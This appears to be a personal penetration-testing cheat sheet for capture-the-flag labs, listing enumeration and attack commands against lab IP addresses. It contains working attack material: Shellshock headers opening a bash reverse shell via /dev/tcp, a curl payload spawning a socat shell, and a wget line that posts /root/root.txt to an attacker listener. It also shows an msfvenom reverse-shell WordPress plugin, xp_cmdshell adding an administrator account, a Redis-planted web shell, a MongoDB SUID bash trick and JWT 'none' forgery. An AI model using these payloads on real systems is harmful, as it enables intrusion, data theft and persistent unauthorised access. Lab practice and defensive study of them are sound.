    - gpp-decrypt (Decrypt Group Policy Preferences password)
        - Good information found here
            - https://adsecurity.org/?p=2288
        - Find gpp files (In Windows)
            > findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
        - gpp-decrypt
            > gpp-decrypt <aes-256 "cpassword" string>


# Service Enumeration
---------------------
## web enumeration
    - virtual host discovery
        - ruby scrpit
            - Read this --> https://github.com/Hacker0x01/h1-212-ctf-solutions/blob/master/writeups/tompohl.md 
            > ruby ~/notes/exam/virtual-host-discovery/scan.rb --ip=10.10.10.56 --wordlist=~/notes/exam/virtual-host-discovery/wordlist --ignore-content-length=11321 --host=shocker.htb > virt-hosts.out
            > cat virt-hosts.out | grep Found | grep 200 | awk -F ':' '{print$2}' | awk '{print$1}' | grep "\."
            - Once found you can add those names to your /etc/hosts and then pound away.
        - VHostScan
            > VHostScan -t 10.10.10.123 -w ~/notes/exam/virtual-host-discovery/wordlist --suffix ".friendzoneportal.red" --ssl -p 443 --ignore-http-codes 404,400
    - nikto commands
        > nikto -ask=no -h http://10.11.1.73:8080
    - go buster commands
        - NOTE!!! Some pages may give back a 200OK for every page. You must specify ' -s "204,301,302,307,401,403" ' if true, that way 200 will be considred bad!
        - NOTE2!! If a page has a .htpasswd file you will need to use -U and -P flags. MUST be in the beginning of the statement (before any other paremters)
        - NOTE3!!! ignore 403 responses -s "200,204,301,302,307" ' if true, that way 200 will be considred bad!
        - Windows (for https use "-k" remember to lower thread count -t50, also TURN OFF PROXY)
            - Common words 
                > gobuster dir -w /usr/share/wordlists/dirb/common.txt -s "200,204,301,302,307" -x "html,php,asp,aspx,txt" -t100 -u http://10.10.10.137:47001 -o gobust_common_.txt
            - Medium words 
                > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s "200,204,301,302,307" -x "html,php,asp,aspx,txt" -t100 -u http://10.10.10.137:47001 -o gobust_medium_.txt
        - Linux (for https use "-k", remember to lower thred count -t50)
            - Common words 
                > gobuster dir -w /usr/share/wordlists/dirb/common.txt -s "200,204,301,302,307" -x "html,php,jsp,cgi,txt" -t100 -u http://10.10.10.138:555 -o gobust_common_.txt
            - Medium words 
                > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s "200,204,301,302,307" -x "html,php,jsp,cgi,txt" -t100 -u http://10.10.10.138:555 -o gobust_medium_.txt
        - autorecon script:
            > gobuster dir -u http://10.11.1.73:5357 -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/dave/SystemsHacked/10.11.1.73/results/10.11.1.73/scans/tcp_5357_http_gobuster_big.txt"
        - another way to scan
            > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40 -u http://10.10.10.143 -o scans/gobuter-80-root-php
    - feroxbuster
        - general scan
            > feroxbuster -k --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --extract-links -u http://192.168.244.117:18000 -o feroxbust_large_18000.txt
        - only include specific return codes  
            > feroxbuster -k -s 200,204,301,302,307 --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --extract-links -u http://192.168.41.136:40873 -o feroxbust_large_40873.txt

        - OH NO 200's!!! (Filter out the size of each 200 response)
            - First access a page that gives a 200 ("/fuck") -> send to burp
            - send capture to repeater, and send again, read the size in the bottom right hand corner. Use that for the filter size
            > feroxbuster --filter-size 1924 --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 200 -u http://192.168.1.106:3000 -o feroxbust_small_3000.txt
    - ffuf
        - OH NO 200's!!! (Filter out the size of each 200 response)
            > ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.106:3000/FUZZ -fs 1924 -o ffuf_small_3000 -of md




    - webgrabber (gather what web page looks like)
        - run gobuster first with an output file, then feed output file into the command below
        > webgrabber http://10.10.10.82 gobust_dh_medium_80.txt
    - dirbuster
        > dirbuster
        > dirbuster -l /usr/share/wordlists/dirb/common.txt -e php,txt,cgi,html,jsp
        > dirbuster -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -e php,txt,cgi,html,jsp
            - set speed to "faster" to get more threads
    - word press
        - read this site --> https://www.armourinfosec.com/wordpress-enumeration/
        - Make sure to check the absolute path in wp site, make sure you have the hosts name in /etc/hosts. Or the path is correct.
        - Try to access /wp-login.php for site login
        - Using "wpscan"
            - regular scan
                > wpscan --url sandbox.local --enumerate ap,at,cb,dbe
            - aggressive scan with api token
                > wpscan --url http://10.10.10.88/webservices/wp --no-update -e ap --plugins-detection aggressive --plugins-version-detection aggressive --api-token CnKYeaIBqnq8a87OUF3Wd8rbkqpOvjWttJsMry2ZatI| tee wpscan2.out
                > wpscan --url http://10.11.1.73:2869 --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/home/dave/SystemsHacked/10.11.1.73/results/10.11.1.73/scans/tcp_2869_http_wpscan.txt" --api-token CnKYeaIBqnq8a87OUF3Wd8rbkqpOvjWttJsMry2ZatI
            - wordpress login brute force
                > wpscan --url http://10.10.10.37 --usernames 'admin' --passwords /usr/share/wordlists/rockyou.txt
        - Using "nmap"
            > nmap 10.10.10.37 --script=/usr/share/nmap/scripts/http-wordpress-brute.nse,http-wordpress-enum.nse,http-wordpress-users.nse
        - Username enumeration
            - Check the admin of the system by going to the site with "http://10.10.10.37/?author=1"
            - You can also go to the login page to enter a username to see if "you entered for the username <username> is incorrect" indicating that is a valid user on the system
        - Core version
        - wordpress plugin upload
            - wordpress plugin upload (MUST have admin login for the wp-admin portal for this to work)
                > msfvenom -p php/reverse_php LHOST=192.168.49.89 LPORT=80 -f raw > shell.php
                - Create plugin file, contents of "evilplugin.php"
                    <?php
                    /**
                    * Plugin Name: EvilPlugin
                    * Version: 6.6.6
                    * Author: Mr Evil
                    * Author URI: http://evil.plugin.com
                    * License: GPL2
                    */
                    ?>
                - zip package together 
                    > zip evilplugin.zip shell.php evilplugin.php
                - Go to http://192.168.89.55/shenzi/wp-admin/plugin-install.php?tab=upload 
                - upload, and activate
                - start reverse shell
                - go to http://192.168.89.55/shenzi/wp-content/plugins/evilplugin/shell.php
            - malicious wordpress plugin upload
                > wordpwn 192.168.49.89 80 N
                - upload the malicious.zip file to wordpress, activate
                - start reverse shell
                - go to http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
    - JWT
        - Do the following
            1) Intercept traffic in burp
            2) find jwt token
            3) inspect it with base64 -d or https://jwt.io/
            4) Create your own payload remember the following
                - Test none attack
                    > ./jwt-converter.sh 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' '{"typ":"JWT","alg":"none"}' '{"id": "0","guest": "false","admin": true}'
                - Test RSA->H256 attack (if you have a key)
                - possible to brute force?
    - Flask Session Cookie
        - To decode a session cookie:
            >  ./fsct.py -c 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YOm6uQ.qxr820vJ-G3g_ob-FFizSQYpMNU' decode
        - To bake your own cookie:
            - MUST find the SECRET_KEY value first. could be an evn var, or in app.py in plain text
            - Adjust decoded session from above, and encode your own
                > flask_session_cookie_manager3.py encode -s 'Fl@sKy_Sup3R_S3cR3T' -t '{"logged_in":True}'
                - You may need to play with the -t, adjust "true" "True" true or True. Mess with it. Maybe script something to create multiple cookies

    - Gather all links on site
        1) go to site and select "view source"
        2) copy all content to a enum.html file
        3) run pulllinks
            > pulllinks.sh ./html-source.html
            > pulllinks.sh ./html-source.html nofilter





    - SSH
        ssh2ngjohn.py 
            - Look at the page source for "<meta name="generator" content="Wordpress VERSION" />
        - plugins
            - Can be found through source code or in http://10.10.10.37/plugins or /wp-content/plugins
        - theme
            - can be found in page source, search for "theme"
    - phpmyadmin
        - find version in page source
    - droopescan
        > droopescan scan drupal -u http://10.10.10.10
    - shellshock / shell shock
        - Open up burp and intercept a login request on the page, check the header to make sure its being processed by .cgi
        - You could adjust the "User-Agent:" field with the repeater, example code:
            - Regular payload:
                > User-Agent: () { :; }; echo; /usr/bin/id
            - Blind Payload:
                - Start an HTTP server up
                > User-Agent: () { :; }; echo; /usr/bin/wget http://10.10.14.18
                > User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
                - If this does not work try a known port:
                > User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.18/443 0>&1
            - You can use Burp suite as well
                - Intercept payload with proxy
                - Change user agent to the following
                    "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"
    - heartbleed
        - Must check if site is vuln to heart bleed
            > nmap -p 443 --script ssl-heartbleed 10.10.10.79
        - use the python script to gather data
            > python heartbleed.py | grep -v "00 00 00 00 00 00"
        - create sequence for output
            > for i in $(seq 1 100000); do python heartbleed.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done

### Windows IIS
    - Default directories
        - C:\inetpub\wwwroot

### Apache Tomcat Hacks
    - The default web maanger page = http://10.10.10.95:8080/manager/html
        - When logging in it may prompt you to enter a new password, for 7.0 the default was "-U tomcat -P s3cret"
    - tomcatWarDeployer
        > python tomcatWarDeployer.py -U tomcat -P s3cret -v -p 4444 -H 10.10.14.18 10.10.10.95:8080

## ipsec
    - ike-scan 
        > ike-scan 10.10.10.116

## finger
    > cd /home/dave/hackthebox/SystemsHacked/legacy-lin-sunday-10.10.10.76-DONE/finger-user-enum/
    > ./finger-user-enum.pl -U /usr/share/seclists/Username/Name/names.txt -t 10.10.10.76 -v > foundfingers

## SNMP enumeration
    - SNMP commands
        > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt
        > snmp-check -c public 10.11.1.227
        > snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3

## SAMBA/NetBIOS enumeration
    - nmap
        - ls -la /usr/share/nmap/scripts/ | grep -e "smb"
        > nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d 192.168.1.101
        > sudo nmap --script smb-vuln* -p 139,445 192.168.1.101
        > sudo nmap --script smb-enum-shares.nse -p445 10.10.10.123
        > sudo nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10 

    - NetBIOS commands
        > nmblookup -A 10.10.10.10
        > sudo nbtscan -r 10.11.1.0/24
    - SAMBA (SMB) comamnds
        - List samba shares
            > echo exit | smbclient -L \\\\192.168.1.101
            > nmap --script smb-enum-shares -p 139,445 192.168.1.101
        - smbmap
            > smbmap -H 10.10.10.100
            > smbmap -H 10.10.10.100 -u guest -p password
            > smbmap -H 10.10.10.100 -P 445 -R --skip
        - smbget
            > smbget -R smb://10.10.10.100/sudo Replication
    - smb version
        - go into ~/notes/exam/smbver.sh
        - edit smbver.sh to add the specific interface to send packats out of.
        - sudo ./smbver.sh 10.10.10.10 
        - Could also run a nmap script
            > sudo nmap -p 445 --script smb-protocols 192.168.1.38
    - enum4linux
        > enum4linux -a 10.10.10.161
        > enum4linux -u 'guest' -p '' -a 192.168.1.101
    - enum4linux nextgen
        > enum4linux-ng.py 192.168.125.131 -oY _enum4linux.out

## WINRM
    - nmap
        > nmap -p 5985 -sV 10.10.10.161

## NFS enumeration
    - NFS enumeration:
        > nmap -v -p 111 10.11.1.0/24 -oG rpcbind.txt
        > nmap -sV -p 111 --script=rpcinfo 10.11.1.0/24
        > nmap -p 111 --script nfs* 10.11.1.72 
        > showmount -e 10.11.1.72

## .Net Framework 
    - Windows .net framework lookup (run from windows)
        > reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

## VOIP
    - SIP
        - sipvicious
            - Scan system
                > svmap 10.10.10.7
            - Map out extensions

## Oracle RDBMS
    - ODAT
        - Check everything
            > odat all -s 10.10.10.82 -p 1521
        - Upload a file
          NOTE: YOU MUST set the FULL PATH to the file if just useing "odat"
            > python3 ./odat.py utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --putFile 'C:\inetpub\wwwroot\' 'test.txt' /tmp/test.txt --sysdba 
            > odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --putFile 'C:\inetpub\wwwroot\' 'hacked.html' /home/dave/hackthebox/SystemsHacked/legacy-win-silo-10.10.10.82/hacked.html --sysdba 
    - tnscmd10g
        > tnscmd10g status -h 10.10.10.82 -p 49160
        > tnscmd10g version -h 10.10.10.82 -p 49160
    - oscanner
        > sudo oscanner -s 10.10.10.82 -P 1521


## Printers (IPP CUPS)
    - PRET
        > python ~/Downloads/GITHUBSTUFF/PRET/pret.py 192.168.146.98 -s ps



## zookeeper
    - zkcli
        > zkcli -s "192.168.146.98:2181"
            - get, ls commands (run help to get info)
        > telnet 192.168.146.98 2181
            > dump: Lists the outstanding sessions and ephemeral nodes. This only works on the leader.
            > envi: Print details about serving environment
            > kill: Shuts down the server. This must be issued from the machine the ZooKeeper server is running on. (Haven't tried this one)
            > reqs: List outstanding requests
            > ruok: Tests if server is running in a non-error state. The server will respond with imok if it is running. Otherwise it will not respond at all.
            > srst: Reset statistics returned by stat command.
            > stat: Lists statistics about performance and connected clients.

## IDENT
    - connection
        > telnet 192.168.190.60 113
    - enumerate users
        > ident-user-enum 22 113 5432 8080 10000

# VPN (IPSEC / IKE) connections
-------------------------------
## Strong swan  
    > vi /etc/ipsec.conf
        - This file will need to be edited with the correct settings. "conceal"
          was a htb machine, the settings are for the specific ike, esp, and 
          key exchange settings. enumerate to figure out how to configure
          "left" is your IP
          "right" is the gateway (box) you are connecting to, also adjust 
          "rightsubnet"
    > vi /etc/ipsec.secrets
        - This file is the actual PSK password to use, must be in plain text.
    - sudo ipsec start
    - sudo ipsec conceal up
    - Once everything is connected ( should read connection 'conceal' established successfully )
    - You can now try to enumerate again.


# Clients:
----------
    - ssh(22) for using older ciphers
        - Using a different suite
            > ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7
            - or edit ~/.ssh/config
                - add the following
                - Host 10.10.10.76
                    KexAlgorithms +diffie-hellman-group1-sha1
                - sudo systemctl restart sshd
        - Using a differnt port
            > ssh -p 22022 root@10.10.10.76
        - Using a users private key
            - Copy private key to a file. Name it whatever. Make sure to get rid of any extra spaces. Keep the "BEGIN" and "END" comments in the file.
            > chmod 600 <file name>
            > ssh amrois@10.10.10.43 -i privkeyfile.rsa
        - Create a user with no password, SSH to that user (on kali from victem), good for scping files over
            > vi /etc/ssh/sshd_config
                - Change "PasswordAuthentication yes"
                - Change "PermitEmptyPasswords yes"
            - save and restart sshd
                > systemctl restart sshd
            - create user with no password
                > adduser removeme
                > sudo passwd -d removeme
            - SSh to yourself with no password 
                > ssh removeme@<YourkaliIP> -o StrictHostKeyChecking=accept-new"
                >  ssh max@192.168.69.100 -i id_rsa scp -o "StrictHostKeyChecking=accept-new" -P 222 removeme@192.168.49.69:/tmp/authorized_keys ./.ssh/authorized_keys
        - Create .ssh dir and authorized keys for easy access
            > mkdir ~/.ssh/; touch ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
            - Add your id_rsa.pub key to authorized keys
            - should be able to ssh to the system with no password

    - webDAV(80) cadaver client commands
        - Make sure nmap scan comes back with webdav
        - When performing a "GET" file format must be supported (TXT for output files)
        > cadaver http://10.10.10.15
        > PUT shell.txt
        > MOVE shell.txt shell.aspx
        - If you cant MOVE do the following:
            > put tcp443meterp.asp tcp443meterp.txt
            > copy tcp443meterp.txt tcp443meterp.asp;.txt
    - WGET(80) client commas
        > wget http://10.10.10.10/filetodownload.txt -O /tmp/filetodownload.txt
        > chmod 777 /tmp/filetodownload.txt
        - download and output to specific place
            > wget -O google-wget.txt www.google.com
            > sudo wget -O /root/troll http://10.10.14.18:5555/troll
        - send contents of a file with wget to nc 
            - On listening server
                > sudo nc -nlvp 80 > root.txt
            - Onosystem sending
                > sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.18
        k download entire site:
            wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --domains yoursite.com --no-parent http://10.10.10.75/nibbleblog/
            wget \
                --recursive \ # Download the whole site.
                --page-requisites \ # Get all assets/elements (CSS/JS/images).
                --adjust-extension \ # Save files with .html on the end.
                --span-hosts \ # Include necessary assets from offsite as well.
                --convert-links \ # Update links to still work in the static version.
                --restrict-file-names=windows \ # Modify filenames to work in Windows as well.
                --domains yoursite.com \ # Do not follow links outside this domain.
                --no-parent \ # Don't follow links outside the directory you pass in.
                    yoursite.com/whatever/path # The URL to download
    - fetch(80) client commands
        > fetch http://10.10.14.28:8088/grouping
    - curl(80) client commands
        - SImple get to server to see reply
            >curl -v http://10.10.10.10/home.php
        - GET
            - Get and write to a file
                > curl https://example.com -k -o my.file
                > curl http://example.com -s -o my.file
            - Get and write to stdout
                > curl -O google-wget.txt www.google.com
        - POST
            > curl -d "user=user1&pass=abcd" POST http://example.com/login
        - POST with --data
            > curl -X POST --data "code=os.system('socat TCP:192.168.49.153:80 EXEC:bash')" http://192.168.153.117:50000/verify --proxy 127.0.0.1:8080
        - SEND FILE
            > curl --form "fileupload=#myfile.txt" https://example.com/resource.cgi
        - How to change the version of TLS
            > sudo vi /etc/ssl/openssl.cnf
            - Change "MinProtocol = TLSv1.2" to "MinProtocol = TLS1.0"
            - Save and run again
    - VBS wget script(80) for windows commands
        - copy code from ~/notes/exam/wget.vbs to windows, name "wget.vbs"
        > cscript wget.vbs http://192.168.1.156/filesharedonhttpserver.txt
    - FTP(21) client commands
        > ftp 10.10.10.11
        > ftp 10.10.10.11 33021
        -lftp
            - Auto login
                > lftp -u ftpuser,ftppassword sftp://10.10.10.202/conf-backups
                > lftp -u anonymous sftp://10.10.10.202/conf-backups
                > lftp -u anonymous ftp://10.10.10.202:1221
                - you may need to se passive mode false 
                > lftp -e "set ftp:passive-mode false" -u admin,admin 192.168.69.56
                - Other options to disable if not working
                    set ftp:ssl-allow false
                    set ftp:passive-mode off
                    set ssl:verify-certificate no
            - Auto login / passive mode
                > lftp -e 'set ftp:passive-mode true' -u anonymous 192.168.239.68
            - Delete files with globbing
                > glob -a mrm -rf myfiles*
            - Mirror
                > lftp -e "mirror -R /backups ./conf-backups" -u ftpuser,ftppassword sftp://10.0.8.202
            - Find recursivly (after connecting with lftp)
                > find -l
        - Recusivly download all files
            > wget -r ftp://anonymous:@192.168.153.127:30021

    - SCP(22) client commands
        > transfer to > scp file.txt username@10.10.10.10:/tmp
        > transfer from > scp username@10.10.10.10:/tmp/file .
    - TFTP(69) client commands
        - Windows:
            > tftp -i 192.168.119.135 put bank-account.zip
        - Linux:
            > tftp 192.168.119.135 put bank-account.zip
    - NFS(111, redirect 2049):
        - Configuration file
            - /etc/exports
        - List mount points
            > showmount -e 10.10.10.76
        - Check version of rpc running
            > rpcinfo -p 192.168.1.193
                - Check if mountd is running
        - List users on system (like Finger) 
            > rusers -al 10.10.10.76
        - Mount on specific port
            > mount > sudo mount -o port=34505 -t nfs 10.10.10.76:/some_directory /mnt/test
        - other commands
            > mount > sudo mount -t fts 10.10.10.76:/home ~/nfs-share
            > mount > sudo mount -t nfs -o nfsvers=3 10.11.1.72:/home ~/nfs-share
        - create user with UID to access mount
            > adduser pwn
            > sudo sed -i -e 's/1001/1014/g' /etc/passwd
        > umount > sudo umount -f -l ~/nfs-share
    - SMTP(25):
        - connect
            > telnet 10.11.1.217 25
            > nc 10.11.1.217 25
                > HELO
                > HELO aaa
                - Verify users
                    > VRFY <user>
                - Verify with recipt
                    > MAIL FROM: <valid email address>
                    > RCPT TO: <email address to test>
                - Send an email
                    > MAIL FROM: <valid email address>
                    > RCPT TO: <email address to test>
                    > DATA
                        - Type whatever you want, end with a newline starting wtih "." to end and send at the same time
                    

        > SMTP-VRFY root 10.11.1.217 25
        - Windows server ntlm check
            > nmap -p 25 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=htb.local 10.10.10.51 -d
        - smtp-user-enum
            - VRFY (check for users)
                > smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 11.10.10.51 | tee _smtp_vrfy_enum
                > smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.51 | tee _smtp_expn_enum
                > smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.51 | tee _smtp_rcpt_enum
            - Check for users email address
                > smtp-user-enum -M VRFY -D mail.ignite.lab -u raj -t 192.168.1.107
        - nmap
            > nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={EXPN,VRFY,RCPT} -p 25 10.10.10.51
        - ismtp
            > ismtp -h 192.168.1.107:25 -e /usr/share/seclists/Usernames/Names/names.txt
        - swaks
            > swaks --to root@10.10.10.51 --server 10.10.10.51
    - SMTPS(465):
        - connect
            > openssl s_client -crlf -connect smtp.mailgun.org:465
    - POP3(110):
        - connect
            > nc -nv 10.10.10.51 110
        - enumerate users
            - telnet 10.10.10.51 110
                > USER admin
                > PASS userpassword
                > LIST 
                > RETR 1
        - brute force
            - nmap -p 110 --script=pop3-brute 10.10.10.110
        - ntlm info
            - nmap -p 110 --script pop3-ntlm-info 10.10.10.51

    - POP3 secure (995):
        - connect
            > openssl s_client -connect 10.10.10.51:995 -crlf -quiet 
        - ntlm info
            > telnet 192.168.103.39 143
            > a1 AUTHENTICATE NTLM

    - IMAP (143)
        - connect
            > nc -nv 192.168.103.39 143
        - Login
            > A001 login <username> <password>

    - IMAP secure (993)
        - connect
            > openssl s_client -connect 192.168.103.39:993 -quiet
            > ncat --ssl 192.168.103.339 993



    - SNMP(161):
        > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt
        > snmp-check -c public 10.11.1.227
        > snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3
        > snmp-walker filewithips communitystring
        - Intersting Object IDs (OID) [Windows]
            - 1.3.6.1.4.1.77.1.2.25 -- Windows object ID for users
            - 1.3.6.1.2.1.25.4.2.1.2 -- Windows running processes
            - 1.3.6.1.2.1.6.13.1.3 -- Windows open TCP ports
            - 1.3.6.1.2.1.25.6.3.1.2 -- Windows installed software
        - Bruteforce SNMP:
            > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt && nclean open-snmp.txt > ips2
            > onesixtyone -c community-names-word-list.txt -i list-of-ips.txt
    - smb(445) client commands:
        - Config location
            - /etc/samba/smb.conf
        - Mounting
            - Linux
                - Change username version
                    > sudo vi /etc/samba/smb.conf
                    > change "min protocol"
                    > sudo systemctl restart smbd.service
                > mount > sudo mount -t cifs //10.11.1.101/print$ /mnt
                > mount > sudo mount -t cifs -o username=guest '\\10.11.1.101\wwwroot' /mnt/
                or
                > mount > sudo mount.cifs '//10.10.10.10/Shared' /mnt/ -o username=guest 
                > umount > sudo umount -f -l /mnt
                > list mounts > cat /proc/mounts
            - Windows
                > \\10.10.14.18\smb\file-to-download.exe
        - sambaclient
            > smbclient -U 'tyler%password' //10.10.10.97/newsite
                ( this may work too) > echo exit | smbclient -N -L \\\\10.10.10.10
            > put test.txt
            > get filetodownload.txt
        - psexec.py (requires a writable smb share, but will give shell. Requires user / password)
            > psexec.py active.htb/svc_tgs@10.10.10.100
        - smbexec.py (rpc and smb, but will give shell. Requires user / password)
            > smbexec.py active.htb/svc_tgs@10.10.10.100
        - wmiexec.py
            > wmiexec.py active.htb/svc_tgs@10.10.10.100 
        - magic script
            - links:
                - https://www.oreilly.com/openbook/samba/book/ch08_02.html
                - https://samba.samba.narkive.com/3wKX7vIg/magic-script-problem
            - You need to get access to /etc/samba/smb.conf. Check if "magic script" is used under a share
              if so you can upload a script with that name to any SUBDIRECTORY (Not root path)
            - create shell script to ping you
            - Connect with samba client with specific user
            - upload the script to a subdirectory, should run automatically, and then delete itself. 
              if the script is running a revrese shell, the script will remain until you close the session. 
        - Loook for smbpasswd files!

    - rsync(873) client commands:
        - Enumerate:
            > nc -nv 192.168.131.126 873
                - Banner should show, type same thing
                > @RSYNCD: 31.0
                > #list
                - Should list all directories
                - connect again, type banner, now type the shared folder name. if "@RSYNCD: OK" displays you can access without password
            > nmap -sV --script "rsync-list-modules" -p 873 192.168.131.126
        - Pull files
            > mkdir rsync/
            - The following will copy over all files and folders locally to your system
            - No password
                > rsync -av rsync://192.168.131.126/fox ./fox
            - With password
                > rsync -av rsync://username@192.168.131.126/fox ./fox
        - Put files
            > rsync -av home_user/.ssh/ rsync://192.168.131.126/fox/.ssh
        
    - ms sql client commands
        > sqsh -S 10.11.1.31 -U sa -P password -D database
        - Get a list of current databases
            > SELECT name FROM master.sys.databases
            > go
        - EXEC sp_databases
        - Manually enable sp_cmdshell
            1> SP_CONFIGURE 'show advanced options', 1
            2> go
            Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
            (return status = 0)
            1> reconfigure
            2> go
            1> SP_CONFIGURE 'xp_cmdshell', 1
            2> go
            Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
            (return status = 0)
            1> reconfigure
            2> go
        - Create an admin user
            > EXEC master..xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt'
            > go
            > EXEC master..xp_cmdshell 'net user /add cooldude password123'
            > go
            > EXEC master..xp_cmdshell 'net localgroup administrators cooldude /add'
            > go
    - mysql client commands
        > mysql -h 10.11.1.111 -u root -p
        > mysql -h 10.11.1.111 --port 330006 -u root -p
        > show databases;
        > use users;
        > SHOW TABLES;
            > select * from TABLE;
            or to view a table that is too big
            > select * from TABLE\G
        > CREATE TABLE <table name> (id VARCHAR(20), firstname VARCHAR(20), lastname VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25));
        > INSERT into <table name> (id, firstname, lastname, username, email, password) VALUES (‘1’, ‘Yeah’, ‘Hub’, ‘yeahhub’, ‘yeahhub@gmail.com’, ‘123456’);
        - Convert base64 passwords ("username" is the users column in the table, "password" password column "users" is the table)
            > SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)),CHAR) FROM users;
    - sqlplus client commands (used for oracle)
        - Connect as regular user
            - sqlplus username/password@<serverip>/<DBMS>
                > sqlplus scott/tiger@10.10.10.82:1521/XE
        - Connect as sysdba
            - sqlplus username/password@<serverip>/<DBMS>
                > sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
        - PLSQL commands:
            > select name, passwd from sys.EXU8USRU;
            > select * from user_role_privs;
            > select * from v$version;
            > select * from all_users;
            > SELECT * FROM USER_SYS_PRIVS; 
            > select * from user_tab_privs;
    - postgres sql
        - Connect to the server remotely
            > psql -h 192.168.190.60 -U postgres -W 
            > psql -h 192.168.190.60 -U postgres -W postgres -p 5437
        - commands
            - List databases
                > \list
            - use a database
                > \c <database name>
            - list tables
                > \d
            - get users roles
                > \du+
        - psql cmd execution
            > psql-mass-rce.py 192.168.91.47 --port 5437 --command "whoami"
    - mongodb (27017):
        > mongo --host 192.168.69.69
        > mongo --host 192.168.69.69 --port 12345
        > db
        > use <db name>
        > mongo -p password -u mark scheduler
        - once in the scheduler add a line to create suid binary in /tmp
            > db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/puckbash; chmod u+s /tmp/puckbash;" } );
        - run binary to be said user
            > /tmp/puckbash -p

    - rpc client commands (135)
        > rpcinfo -p 192.168.1.197
            - Check out all the services running under rpc, a few that are exploitable are "YP", "ttdserver" and "cmsd"
        - Logon on with default creds
            > rpcclient -U "" 192.168.1.197
        - Logon with user creds
            > rpcclient -U dave%password -c "queryusers dog" 192.168.1.197
        - rpc commands
            - look up all users
                > enumdomusers
            - look up all groups
                > enumdomgroups
            - look up users
                > queryuser <username>
            - look up domain info
                > querydominfo
            - lookup privledges
                > enumprivs
        - winexe
            > winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
    - winrm(5985)
        - evilrm
            - https://github.com/Hackplayers/evil-winrm
            > evil-winrm -i 10.10.10.82 -u scott -p 'tiger'
    - James Admin (4555)
        > nc 10.10.10.51 4555
    - finger(79)
        - list all users
            > finger @10.10.10.76
        - Other finger commands to exploit system
            > finger user@10.10.10.76
            > finger 0@target.host
            > finger .@target.host
            > finger **@target.host
            > finger user@target.host
            > finger test@target.host
        - finger bounce
            > finger@finger-server-ip@yourip
        - injection
            > finger "|/bin/id@10.10.10.76"
    - redis(6379):
        - Access with no password
            > redis-cli -h 192.168.91.93
        _ Access with password
            > redis-cli -h 192.168.91.93 -a MyPaSWoRd123
        - Commands
            - Delete all keys in database
                > flushall
            - Check database size
                > dbsize
            - seach for a directory path
                > config get dir <directory path>
            - dofile check files
                > redis-cli -h 192.168.91.93 -p 6379 eval "dofile('/etc/passwd')" 0
                    - Try varations
                        > EVAL dofile('/etc/passwd') 0
        - web shell
            - List of commands: https://redis.io/commands/info
            > redis-cli -h 192.168.187.69
            > info
            > config set dir /var/www/html
            > config set dbfilename redis.php
            > set test "<?php phpinfo(); ?>"
            > save
            - now access the site to see if if the file is avaialble 
        - ssh key load
        - cronjob 
        - module load
